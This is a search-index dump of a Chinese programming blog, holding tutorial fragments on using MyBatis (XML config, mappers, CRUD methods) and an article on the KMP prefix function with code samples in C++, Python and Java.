当映射的方法参数超过一个的时候，强烈建议使用@Param注解将方法中的参数和Mapper中的SQL语句的参数对应起来，不然可能出现莫名奇妙的错误。 ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-2/:1:2","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行增删改查","uri":"/articles/2024/03/mybatis-2/"},{"categories":["Java"],"content":"删除数据 同理，先定义\u003cdelete\u003e标签，然后在接口中编写对应的函数即可： \u003cdelete id=\"deleteStudent\"\u003e delete from student where id = #{id} \u003c/delete\u003e int deleteStudent(int id); 接着使用即可： System.out.println(\"Delete the new student...\"); System.out.println(testMapper.deleteStudent(235299)); 将Mapper绑定到接口后，Mybaits的优势就展现出来了，可以非常方便的调用自定义的接口方法来实现对数据库统一的操作。 ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-2/:1:3","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行增删改查","uri":"/articles/2024/03/mybatis-2/"},{"categories":["Java"],"content":"Mybatis简介 MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生信息，将接口和 Java 的 POJOs(Plain Ordinary Java Object,普通的 Java对象)映射成数据库中的记录。 封装了数据库中记录和Java对象的转换 ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-1/:1:0","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis基本使用","uri":"/articles/2024/03/mybatis-1/"},{"categories":["Java"],"content":"XML语言 XML语言发明最初是用于数据的存储和传输（写配置文件用的）。 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003couter\u003e \u003cname\u003e阿伟\u003c/name\u003e \u003cdesc\u003e怎么又在玩电动啊\u003c/desc\u003e \u003cinner type=\"1\"\u003e \u003cage\u003e10\u003c/age\u003e \u003csex\u003e男\u003c/sex\u003e \u003c/inner\u003e \u003c/outer\u003e HTML是为了展示文件，XML是为了储存文件 一个XML文件存在以下的格式规范： 必须存在一个根节点，将所有的子标签全部包含。 可以但不必须包含一个头部声明（主要是可以设定编码格式） 所有的标签必须成对出现，可以嵌套但不能交叉嵌套 区分大小写。 标签中可以存在属性，比如上面的type=\"1\"就是inner标签的一个属性，属性的值由单引号或双引号包括。 XML的注释内容和HTML一样 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!-- 注释内容 --\u003e XML中存在转义字符以防止产生歧义： 使用CDATA可以快速创建不解析的区域： \u003ctest\u003e \u003cname\u003e\u003c![CDATA[我看你\u003c\u003e\u003c\u003e\u003c\u003e是一点都不懂哦\u003e\u003e\u003e]]\u003e\u003c/name\u003e \u003c/test\u003e 为了在Java中读取xml配置文件的信息，JDK为我们内置了一个叫做org.w3c的XML解析库来解析xml文件： // 创建DocumentBuilderFactory对象 DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // 创建DocumentBuilder对象 try { DocumentBuilder builder = factory.newDocumentBuilder(); Document d = builder.parse(\"file:mappers/test.xml\"); // 每一个标签都作为一个节点 NodeList nodeList = d.getElementsByTagName(\"test\"); // 可能有很多个名字为test的标签 Node rootNode = nodeList.item(0); // 获取首个 NodeList childNodes = rootNode.getChildNodes(); // 一个节点下可能会有很多个节点，比如根节点下就囊括了所有的节点 //节点可以是一个带有内容的标签（它内部就还有子节点），也可以是一段文本内容 for (int i = 0; i \u003c childNodes.getLength(); i++) { Node child = childNodes.item(i); if(child.getNodeType() == Node.ELEMENT_NODE) //过滤换行符之类的内容，因为它们都被认为是一个文本节点 System.out.println(child.getNodeName() + \"：\" +child.getFirstChild().getNodeValue()); // 输出节点名称，也就是标签名称，以及标签内部的文本（内部的内容都是子节点，所以要获取内部的节点） } } catch (Exception e) { e.printStackTrace(); } 目前很多框架都会使用XML来作为配置文件，主要是认识即可 ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-1/:2:0","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis基本使用","uri":"/articles/2024/03/mybatis-1/"},{"categories":["Java"],"content":"Mybatis的使用 中文文档网站：https://mybatis.org/mybatis-3/zh_CN/getting-started.html 首先需要创建Mybatis的配置文件，在根目录下创建mybaits-config.xml文件，加入官方文档中的内容： \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE configuration PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\" \"https://mybatis.org/dtd/mybatis-3-config.dtd\"\u003e \u003cconfiguration\u003e \u003cenvironments default=\"development\"\u003e \u003cenvironment id=\"development\"\u003e \u003ctransactionManager type=\"JDBC\"/\u003e \u003cdataSource type=\"POOLED\"\u003e \u003cproperty name=\"driver\" value=\"${driver}\"/\u003e \u003cproperty name=\"url\" value=\"${url}\"/\u003e \u003cproperty name=\"username\" value=\"${username}\"/\u003e \u003cproperty name=\"password\" value=\"${password}\"/\u003e \u003c/dataSource\u003e \u003c/environment\u003e \u003c/environments\u003e \u003cmappers\u003e \u003cmapper resource=\"org/mybatis/example/BlogMapper.xml\"/\u003e \u003c/mappers\u003e \u003c/configuration\u003e 我们需要自定义的选项是： ${driver}：改写成使用的相应的数据库的驱动 ${url}：写成JDBC的连接url，可以在IDEA的数据库配置页面查询到 ${username}：即数据库的用户名 ${password}：即数据库的密码 其中mappers暂时没有用到，可以先删除掉 在Java中创建一下SqlSessionFactory来打开一个SqlSession： import org.apache.ibatis.session.SqlSession; import org.apache.ibatis.session.SqlSessionFactory; import org.apache.ibatis.session.SqlSessionFactoryBuilder; import java.io.FileInputStream; import java.io.IOException; public class Main { public static void main(String[] args) throws IOException { FileInputStream fileInputStream = new FileInputStream(\"mybatis-config.xml\"); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(fileInputStream); try (SqlSession session = sqlSessionFactory.openSession(true)) { } } } 那Mybatis究竟做了什么？每个基于 MyBatis 的应用都是以一个 SqlSessionFactory 的实例为核心的，我们可以通过SqlSessionFactory来创建多个新的会话，SqlSession对象，每个会话就相当于在不同的地方登陆一个账号去访问数据库，会话之间相互隔离，没有任何关联。 而通过SqlSession就可以完成几乎所有的数据库操作，我们发现这个接口中定义了大量数据库操作的方法，因此，现在我们只需要通过一个对象就能完成数据库交互了，极大简化了之前的流程。 接下来，为了将数据库查询结果直接返回为对象，需要实现一个Mapper作为数据库查询结果和Java对象的映射，内容大体如下所示： \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"\u003e \u003cmapper namespace=\"TestMapper\"\u003e \u003cselect id=\"selectStudent\" resultType=\"com.entity.Student\"\u003e select * from student \u003c/select\u003e \u003c/mapper\u003e 然后在Mybatis配置文件中加入Mapper： \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE configuration PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\" \"https://mybatis.org/dtd/mybatis-3-config.dtd\"\u003e \u003cconfiguration\u003e \u003cenvironments default=\"development\"\u003e \u003cenvironment id=\"development\"\u003e \u003ctransactionManager type=\"JDBC\"/\u003e \u003cdataSource type=\"POOLED\"\u003e \u003cproperty name=\"driver\" value=\"com.mysql.cj.jdbc.Driver\"/\u003e \u003cproperty name=\"url\" value=\"jdbc:mysql://localhost:3306\"/\u003e \u003cproperty name=\"username\" value=\"root\"/\u003e \u003cproperty name=\"password\" value=\"998244353\"/\u003e \u003c/dataSource\u003e \u003c/environment\u003e \u003c/environments\u003e \u003cmappers\u003e \u003cmapper url=\"file:TestMapper.xml\"/\u003e \u003c/mappers\u003e \u003c/configuration\u003e 注意是在configuration的最后添加mappers标签。接下来直接通过session的selectList方法就可以把所有查询的结果自动转换为Student对象并且返回一个List结构中。 import org.apache.ibatis.session.SqlSession; import org.apache.ibatis.session.SqlSessionFactory; import org.apache.ibatis.session.SqlSessionFactoryBuilder; import java.io.FileInputStream; import java.io.IOException; import java.util.List; import com.entity.Student; public class Main { public static void main(String[] args) throws IOException { FileInputStream fileInputStream = new FileInputStream(\"mybatis-config.xml\"); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(fileInputStream); try (SqlSession session = sqlSessionFactory.openSession(true)) { List\u003cStudent\u003e studentList = session.selectList(\"selectStudent\"); studentList.forEach(System.out::println); } } } ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-1/:3:0","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis基本使用","uri":"/articles/2024/03/mybatis-1/"},{"categories":["Java"],"content":"优化Mybatis的使用 可以在另外一个类中集成对SqlSessionFactory的创建，然后每次使用的时候只需要openSession即可。 import org.apache.ibatis.session.SqlSession; import org.apache.ibatis.session.SqlSessionFactory; import org.apache.ibatis.session.SqlSessionFactoryBuilder; import java.io.FileInputStream; import java.io.FileNotFoundException; public class MybatisUtil { //在类加载时就进行创建 private static SqlSessionFactory sqlSessionFactory; static { try { sqlSessionFactory = new SqlSessionFactoryBuilder().build(new FileInputStream(\"mybatis-config.xml\")); } catch (FileNotFoundException e) { e.printStackTrace(); } } /** * 获取一个新的会话 * @param autoCommit 是否开启自动提交（跟JDBC是一样的，如果不自动提交，则会变成事务操作） * @return SqlSession对象 */ public static SqlSession getSession(boolean autoCommit){ return sqlSessionFactory.openSession(autoCommit); } } public class Main { public static void main(String[] args) throws IOException { try (SqlSession session = MybatisUtil.getSession(true)) { List\u003cStudent\u003e studentList = session.selectList(\"selectStudent\"); studentList.forEach(System.out::println); } } } ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-1/:3:1","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis基本使用","uri":"/articles/2024/03/mybatis-1/"},{"categories":["Java"],"content":"使用接口方法返回对象 在之前的操作中，我们使用如下操作来获得数据库转换成为的对象： List\u003cStudent\u003e studentList = session.selectList(\"selectStudent\"); studentList.forEach(System.out::println); 在使用这个方法之前，我们必须知道： mapper的ID 返回值的类型 对象的类型 为了隐藏上面的实现，我们可以使用接口来绑定特定的mapper和方法。我们只需要调用该方法即可获得对象的信息。首先我们定义以下接口，使得方法名称是mapper的ID： public interface TestMapper { List\u003cStudent\u003e selectStudent(); } 接着，将mapper配置文件中的namespace绑定为该接口： \u003cmapper namespace=\"com.mappers.TestMapper\"\u003e \u003cselect id=\"selectStudent\" resultType=\"com.entity.Student\"\u003e select * from student \u003c/select\u003e \u003c/mapper\u003e 接下来，我们只需要通过sqlSession的getMapper方法，即可让Mybatis自动实现TestMapper接口，并且调用selectStudent()方法来返回List\u003cStudent\u003e类型。 try (SqlSession session = MybatisUtil.getSession(true)) { TestMapper testMapper = session.getMapper(TestMapper.class); testMapper.selectStudent().forEach(System.out::println); } 以后的开发中将使用接口来进行Sql对象的操作，从而避免使用不明确的返回类型。 ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-1/:3:2","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis基本使用","uri":"/articles/2024/03/mybatis-1/"},{"categories":["Java"],"content":"Mybatis配置解析 environment：在一个配置文件中可以创建不同的环境，每个环境都可以采用不同的数据库，这样以应对不同开发场景下的需求。 transactionManager：事务管理器，常见的即JDBC、MANAGED dataSource：数据源。有三种内建的数据源类型（也就是 type=\"[UNPOOLED|POOLED|JNDI]\"。 POOLED– 这种数据源的实现利用“池”的概念将 JDBC 连接对象组织起来，避免了创建新的连接实例时所必需的初始化和认证时间。 这种处理方式很流行，能使并发 Web 应用快速响应请求。 可以给类型起一个别名，简化Mapper的编写： \u003c!-- 需要在environments的上方 --\u003e \u003ctypeAliases\u003e \u003ctypeAlias type=\"com.test.entity.Student\" alias=\"Student\"/\u003e \u003c/typeAliases\u003e 现在Mapper就可以直接使用别名了： \u003cmapper namespace=\"com.test.mapper.TestMapper\"\u003e \u003cselect id=\"selectStudent\" resultType=\"Student\"\u003e select * from student \u003c/select\u003e \u003c/mapper\u003e 如果这样还是很麻烦，我们也可以直接让Mybatis去扫描一个包，并将包下的所有类自动起别名（别名为首字母小写的类名） \u003ctypeAliases\u003e \u003cpackage name=\"com.test.entity\"/\u003e \u003c/typeAliases\u003e 也可以为指定实体类添加一个注解，来指定别名： @Data @Alias(\"lbwnb\") public class Student { private int sid; private String name; private String sex; } 不同的配置可以省略，但是相对位置不可以改变，否则就会报错。 当然，Mybatis也包含许多的基础配置，通过使用： \u003csettings\u003e \u003csetting name=\"\" value=\"\"/\u003e \u003c/settings\u003e 所有的配置项可以在中文文档处查询，本文不会进行详细介绍，在后面我们会提出一些比较重要的配置项。 ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-1/:3:3","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis基本使用","uri":"/articles/2024/03/mybatis-1/"},{"categories":["Algorithm"],"content":" 本文转自OI-WIKI，仅供学习使用 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:0:0","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"前缀函数 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:1:0","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"定义 给定一个长度为 $n$ 的字符串 $s$，其 前缀函数 被定义为一个长度为 $n$ 的数组 $\\pi$。 其中 $\\pi[i]$ 的定义是： 如果子串 $s[0\\dots i]$ 有一对相等的真前缀与真后缀：$s[0\\dots k-1]$ 和 $s[i - (k - 1) \\dots i]$，那么 $\\pi[i]$ 就是这个相等的真前缀（或者真后缀，因为它们相等））的长度，也就是 $\\pi[i]=k$； 如果不止有一对相等的，那么 $\\pi[i]$ 就是其中最长的那一对的长度； 如果没有相等的，那么 $\\pi[i]=0$。 简单来说 $\\pi[i]$ 就是，子串 $s[0\\dots i]$ 最长的相等的真前缀与真后缀的长度。 用数学语言描述如下： $$ \\pi[i] = \\max_{k = 0 \\dots i}{k: s[0 \\dots k - 1] = s[i - (k - 1) \\dots i]} $$ 特别地，规定 $\\pi[0]=0$。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:1:1","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"过程 举例来说，对于字符串 abcabcd， $\\pi[0]=0$，因为 a 没有真前缀和真后缀，根据规定为 0 $\\pi[1]=0$，因为 ab 无相等的真前缀和真后缀 $\\pi[2]=0$，因为 abc 无相等的真前缀和真后缀 $\\pi[3]=1$，因为 abca 只有一对相等的真前缀和真后缀：a，长度为 1 $\\pi[4]=2$，因为 abcab 相等的真前缀和真后缀只有 ab，长度为 2 $\\pi[5]=3$，因为 abcabc 相等的真前缀和真后缀只有 abc，长度为 3 $\\pi[6]=0$，因为 abcabcd 无相等的真前缀和真后缀 同理可以计算字符串 aabaaab 的前缀函数为 $[0, 1, 0, 1, 2, 2, 3]$。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:1:2","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"计算前缀函数的朴素算法 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:2:0","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"过程 一个直接按照定义计算前缀函数的算法流程： 在一个循环中以 $i = 1\\to n - 1$ 的顺序计算前缀函数 $\\pi[i]$ 的值（$\\pi[0]$ 被赋值为 $0$）。 为了计算当前的前缀函数值 $\\pi[i]$，我们令变量 $j$ 从最大的真前缀长度 $i$ 开始尝试。 如果当前长度下真前缀和真后缀相等，则此时长度为 $\\pi[i]$，否则令 j 自减 1，继续匹配，直到 $j=0$。 如果 $j = 0$ 并且仍没有任何一次匹配，则置 $\\pi[i] = 0$ 并移至下一个下标 $i + 1$。 具体实现如下： vector\u003cint\u003e prefix_function(string s) { int n = (int)s.length(); vector\u003cint\u003e pi(n); for (int i = 1; i \u003c n; i++) for (int j = i; j \u003e= 0; j--) if (s.substr(0, j) == s.substr(i - j + 1, j)) { pi[i] = j; break; } return pi; } def prefix_function(s): n = len(s) pi = [0] * n for i in range(1, n): for j in range(i, -1, -1): if s[0 : j] == s[i - j + 1 : i + 1]: pi[i] = j break return pi 显见该算法的时间复杂度为 $O(n^3)$，具有很大的改进空间。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:2:1","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"计算前缀函数的高效算法 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:3:0","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"第一个优化 第一个重要的观察是 相邻的前缀函数值至多增加 $1$。 参照下图所示，只需如此考虑：当取一个尽可能大的 $\\pi[i+1]$ 时，必然要求新增的 $s[i+1]$ 也与之对应的字符匹配，即 $s[i+1]=s[\\pi[i]]$, 此时 $\\pi[i+1] = \\pi[i]+1$。 $$ \\underbrace{\\overbrace{s_0 ~ s_1 ~ s_2}^{\\pi[i] = 3} ~ s_3}{\\pi[i+1] = 4} ~ \\dots ~ \\underbrace{\\overbrace{s{i-2} ~ s_{i-1} ~ s_{i}}^{\\pi[i] = 3} ~ s_{i+1}}_{\\pi[i+1] = 4} $$ 所以当移动到下一个位置时，前缀函数的值要么增加一，要么维持不变，要么减少。 vector\u003cint\u003e prefix_function(string s) { int n = (int)s.length(); vector\u003cint\u003e pi(n); for (int i = 1; i \u003c n; i++) for (int j = pi[i - 1] + 1; j \u003e= 0; j--) // improved: j=i =\u003e j=pi[i-1]+1 if (s.substr(0, j) == s.substr(i - j + 1, j)) { pi[i] = j; break; } return pi; } def prefix_function(s): n = len(s) pi = [0] * n for i in range(1, n): for j in range(pi[i - 1] + 1, -1, -1): if s[0 : j] == s[i - j + 1 : i + 1]: pi[i] = j break return pi 在这个初步改进的算法中，在计算每个 $\\pi[i]$ 时，最好的情况是第一次字符串比较就完成了匹配，也就是说基础的字符串比较次数是 n-1 次。 而由于存在 j = pi[i-1]+1（pi[0]=0）对于最大字符串比较次数的限制，可以看出每次只有在最好情况才会为字符串比较次数的上限积累 1，而每次超过一次的字符串比较消耗的是之后次数的增长空间。 由此我们可以得出字符串比较次数最多的一种情况：至少 1 次字符串比较次数的消耗和最多 n-2 次比较次数的积累，此时字符串比较次数为 n-1 + n-2 = 2n-3。 可见经过此次优化，计算前缀函数只需要进行 $O(n)$ 次字符串比较，总复杂度降为了 $O(n^2)$。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:3:1","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"第二个优化 在第一个优化中，我们讨论了计算 $\\pi[i+1]$ 时的最好情况：$s[i+1]=s[\\pi[i]]$，此时 $\\pi[i+1] = \\pi[i]+1$。现在让我们沿着这个思路走得更远一点：讨论当 $s[i+1] \\neq s[\\pi[i]]$ 时如何跳转。 失配时，我们希望找到对于子串 $s[0\\dots i]$，仅次于 $\\pi[i]$ 的第二长度 $j$，使得在位置 $i$ 的前缀性质仍得以保持，也即 $s[0 \\dots j - 1] = s[i - j + 1 \\dots i]$： $$ \\overbrace{\\underbrace{s_0 ~ s_1}j ~ s_2 ~ s_3}^{\\pi[i]} ~ \\dots ~ \\overbrace{s{i-3} ~ s_{i-2} ~ \\underbrace{s_{i-1} ~ s_{i}}j}^{\\pi[i]} ~ s{i+1} $$ 如果我们找到了这样的长度 $j$，那么仅需要再次比较 $s[i + 1]$ 和 $s[j]$。如果它们相等，那么就有 $\\pi[i + 1] = j + 1$。否则，我们需要找到子串 $s[0\\dots i]$ 仅次于 $j$ 的第二长度 $j^{(2)}$，使得前缀性质得以保持，如此反复，直到 $j = 0$。如果 $s[i + 1] \\neq s[0]$，则 $\\pi[i + 1] = 0$。 观察上图可以发现，因为 $s[0\\dots \\pi[i]-1] = s[i-\\pi[i]+1\\dots i]$，所以对于 $s[0\\dots i]$ 的第二长度 $j$，有这样的性质： $$ s[0 \\dots j - 1] = s[i - j + 1 \\dots i]= s[\\pi[i]-j\\dots \\pi[i]-1] $$ 也就是说 $j$ 等价于子串 $s[\\pi[i]-1]$ 的前缀函数值，即 $j=\\pi[\\pi[i]-1]$。同理，次于 $j$ 的第二长度等价于 $s[j-1]$ 的前缀函数值，$j^{(2)}=\\pi[j-1]$ 显然我们可以得到一个关于 $j$ 的状态转移方程：$j^{(n)}=\\pi[j^{(n-1)}-1], \\ \\ (j^{(n-1)}\u003e0)$ ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:3:2","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"最终算法 所以最终我们可以构建一个不需要进行任何字符串比较，并且只进行 $O(n)$ 次操作的算法。 而且该算法的实现出人意料的短且直观： vector\u003cint\u003e prefix_function(string s) { int n = (int)s.length(); vector\u003cint\u003e pi(n); for (int i = 1; i \u003c n; i++) { int j = pi[i - 1]; while (j \u003e 0 \u0026\u0026 s[i] != s[j]) j = pi[j - 1]; if (s[i] == s[j]) j++; pi[i] = j; } return pi; } def prefix_function(s): n = len(s) pi = [0] * n for i in range(1, n): j = pi[i - 1] while j \u003e 0 and s[i] != s[j]: j = pi[j - 1] if s[i] == s[j]: j += 1 pi[i] = j return pi 这是一个 在线 算法，即其当数据到达时处理它——举例来说，你可以一个字符一个字符的读取字符串，立即处理它们以计算出每个字符的前缀函数值。该算法仍然需要存储字符串本身以及先前计算过的前缀函数值，但如果我们已经预先知道该字符串前缀函数的最大可能取值 $M$，那么我们仅需要存储该字符串的前 $M + 1$ 个字符以及对应的前缀函数值。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:3:3","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"应用 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:0","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"在字符串中查找子串：Knuth–Morris–Pratt 算法 该算法由 Knuth、Pratt 和 Morris 在 1977 年共同发布[1]。 该任务是前缀函数的一个典型应用。 过程 给定一个文本 $t$ 和一个字符串 $s$，我们尝试找到并展示 $s$ 在 $t$ 中的所有出现（occurrence）。 为了简便起见，我们用 $n$ 表示字符串 $s$ 的长度，用 $m$ 表示文本 $t$ 的长度。 我们构造一个字符串 $s + # + t$，其中 $#$ 为一个既不出现在 $s$ 中也不出现在 $t$ 中的分隔符。接下来计算该字符串的前缀函数。现在考虑该前缀函数除去最开始 $n + 1$ 个值（即属于字符串 $s$ 和分隔符的函数值）后其余函数值的意义。根据定义，$\\pi[i]$ 为右端点在 $i$ 且同时为一个前缀的最长真子串的长度，具体到我们的这种情况下，其值为与 $s$ 的前缀相同且右端点位于 $i$ 的最长子串的长度。由于分隔符的存在，该长度不可能超过 $n$。而如果等式 $\\pi[i] = n$ 成立，则意味着 $s$ 完整出现在该位置（即其右端点位于位置 $i$）。注意该位置的下标是对字符串 $s + # + t$ 而言的。 因此如果在某一位置 $i$ 有 $\\pi[i] = n$ 成立，则字符串 $s$ 在字符串 $t$ 的 $i - (n - 1) - (n + 1) = i - 2n$ 处出现。 正如在前缀函数的计算中已经提到的那样，如果我们知道前缀函数的值永远不超过一特定值，那么我们不需要存储整个字符串以及整个前缀函数，而只需要二者开头的一部分。在我们这种情况下这意味着只需要存储字符串 $s + #$ 以及相应的前缀函数值即可。我们可以一次读入字符串 $t$ 的一个字符并计算当前位置的前缀函数值。 因此 Knuth–Morris–Pratt 算法（简称 KMP 算法）用 $O(n + m)$ 的时间以及 $O(n)$ 的内存解决了该问题。 class Solution { public int[] CalcPrefix(String str) { int len = str.length(); int[] res = new int[len]; for (int i = 1; i \u003c len; ++i) { int j = res[i - 1]; while (j \u003e 0 \u0026\u0026 str.charAt(i) != str.charAt(j)) j = res[j - 1]; if (str.charAt(i) == str.charAt(j)) j++; res[i] = j; } return res; } public int StrStr(String str, String p) { int[] prefix = CalcPrefix(p); int i = 0, j = 0; while (i \u003c str.length()) { if (str.charAt(i) == p.charAt(j)) { i++; j++; } else { if (j == 0) i++; else { j = prefix[j - 1]; } } if (j == p.length()) return i - j; } return -1; } public int strStr(String haystack, String needle) { return StrStr(haystack, needle); } } ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:1","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"字符串的周期 对字符串 $s$ 和 $0 \u003c p \\le |s|$，若 $s[i] = s[i+p]$ 对所有 $i \\in [0, |s| - p - 1]$ 成立，则称 $p$ 是 $s$ 的周期。 对字符串 $s$ 和 $0 \\le r \u003c |s|$，若 $s$ 长度为 $r$ 的前缀和长度为 $r$ 的后缀相等，就称 $s$ 长度为 $r$ 的前缀是 $s$ 的 border。 由 $s$ 有长度为 $r$ 的 border 可以推导出 $|s|-r$ 是 $s$ 的周期。 根据前缀函数的定义，可以得到 $s$ 所有的 border 长度，即 $\\pi[n-1],\\pi[\\pi[n-1]-1], \\ldots$。1 所以根据前缀函数可以在 $O(n)$ 的时间内计算出 $s$ 所有的周期。其中，由于 $\\pi[n-1]$ 是 $s$ 最长 border 的长度，所以 $n - \\pi[n-1]$ 是 $s$ 的最小周期。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:2","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"统计每个前缀的出现次数 在该节我们将同时讨论两个问题。给定一个长度为 $n$ 的字符串 $s$，在问题的第一个变种中我们希望统计每个前缀 $s[0 \\dots i]$ 在同一个字符串的出现次数，在问题的第二个变种中我们希望统计每个前缀 $s[0 \\dots i]$ 在另一个给定字符串 $t$ 中的出现次数。 首先让我们来解决第一个问题。考虑位置 $i$ 的前缀函数值 $\\pi[i]$。根据定义，其意味着字符串 $s$ 一个长度为 $\\pi[i]$ 的前缀在位置 $i$ 出现并以 $i$ 为右端点，同时不存在一个更长的前缀满足前述定义。与此同时，更短的前缀可能以该位置为右端点。容易看出，我们遇到了在计算前缀函数时已经回答过的问题：给定一个长度为 $j$ 的前缀，同时其也是一个右端点位于 $i$ 的后缀，下一个更小的前缀长度 $k \u003c j$ 是多少？该长度的前缀需同时也是一个右端点为 $i$ 的后缀。因此以位置 $i$ 为右端点，有长度为 $\\pi[i]$ 的前缀，有长度为 $\\pi[\\pi[i] - 1]$ 的前缀，有长度为 $\\pi[\\pi[\\pi[i] - 1] - 1]$ 的前缀，等等，直到长度变为 $0$。故而我们可以通过下述方式计算答案。 vector\u003cint\u003e ans(n + 1); for (int i = 0; i \u003c n; i++) ans[pi[i]]++; for (int i = n - 1; i \u003e 0; i--) ans[pi[i - 1]] += ans[i]; for (int i = 0; i \u003c= n; i++) ans[i]++; ans = [0] * (n + 1) for i in range(0, n): ans[pi[i]] += 1 for i in range(n - 1, 0, -1): ans[pi[i - 1]] += ans[i] for i in range(0, n + 1): ans[i] += 1 解释 在上述代码中我们首先统计每个前缀函数值在数组 $\\pi$ 中出现了多少次，然后再计算最后答案：如果我们知道长度为 $i$ 的前缀出现了恰好 $\\text{ans}[i]$ 次，那么该值必须被叠加至其最长的既是后缀也是前缀的子串的出现次数中。在最后，为了统计原始的前缀，我们对每个结果加 $1$。 现在考虑第二个问题。我们应用来自 Knuth–Morris–Pratt 的技巧：构造一个字符串 $s + # + t$ 并计算其前缀函数。与第一个问题唯一的不同之处在于，我们只关心与字符串 $t$ 相关的前缀函数值，即 $i \\ge n + 1$ 的 $\\pi[i]$。有了这些值之后，我们可以同样应用在第一个问题中的算法来解决该问题。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:3","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"一个字符串中本质不同子串的数目 给定一个长度为 $n$ 的字符串 $s$，我们希望计算其本质不同子串的数目。 我们将迭代的解决该问题。换句话说，在知道了当前的本质不同子串的数目的情况下，我们要找出一种在 $s$ 末尾添加一个字符后重新计算该数目的方法。 令 $k$ 为当前 $s$ 的本质不同子串数量。我们添加一个新的字符 $c$ 至 $s$。显然，会有一些新的子串以字符 $c$ 结尾。我们希望对这些以该字符结尾且我们之前未曾遇到的子串计数。 构造字符串 $t = s + c$ 并将其反转得到字符串 $t^{\\sim}$。现在我们的任务变为计算有多少 $t^{\\sim}$ 的前缀未在 $t^{\\sim}$ 的其余任何地方出现。如果我们计算了 $t^{\\sim}$ 的前缀函数最大值 $\\pi_{\\max}$，那么最长的出现在 $s$ 中的前缀其长度为 $\\pi_{\\max}$。自然的，所有更短的前缀也出现了。 因此，当添加了一个新字符后新出现的子串数目为 $|s| + 1 - \\pi_{\\max}$。 所以对于每个添加的字符，我们可以在 $O(n)$ 的时间内计算新子串的数目，故最终复杂度为 $O(n^2)$。 值得注意的是，我们也可以重新计算在头部添加一个字符，或者从尾或者头移除一个字符时的本质不同子串数目。 